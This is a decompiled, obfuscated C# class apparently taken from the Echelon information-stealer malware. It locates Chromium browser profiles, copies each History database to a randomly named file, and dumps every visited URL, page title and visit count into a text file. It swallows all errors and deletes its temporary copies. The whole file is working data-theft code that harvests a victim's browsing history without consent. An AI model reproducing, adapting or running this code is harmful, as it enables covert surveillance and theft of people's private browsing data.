using Echelon;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

internal class s
{
	public static int a;

	public static void a(string au)
	{
		try
		{
			List<string> list = t.a();
			Random random = new Random();
			foreach (string item in list)
			{
				try
				{
					using (StreamWriter streamWriter = new StreamWriter(au + "\\History_Chromium.txt", append: true, Encoding.Default))
					{
						streamWriter.WriteLine($"Browser - {item}\n\n");
						string text = item + "\\History";
						_ = new FileInfo(text).Length;
						string text2 = Global.AppDate + "\\System_" + random.Next(10000000);
						File.Copy(text, text2, overwrite: true);
						if (item.Contains("Guest Profile") || item.Contains("System Profile"))
						{
							File.Delete(text2);
						}
						else
						{
							x x = new x(text2);
							x.e("urls");
							if (x.b() != 65536)
							{
								for (int i = 0; i < x.b(); i++)
								{
									try
									{
										string arg = x.a(i, 1);
										string @string = Encoding.UTF8.GetString(Encoding.Default.GetBytes(x.a(i, 2)));
										int num = Convert.ToInt16(x.a(i, 3)) + 1;
										streamWriter.Write($"Site: {arg}\t\nTittle: {@string}\t\nVisit count: {num}\t\n\n\n");
										s.a++;
									}
									catch
									{
									}
								}
								streamWriter.WriteLine($"\n\n");
								File.Delete(text2);
							}
						}
					}
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}
}
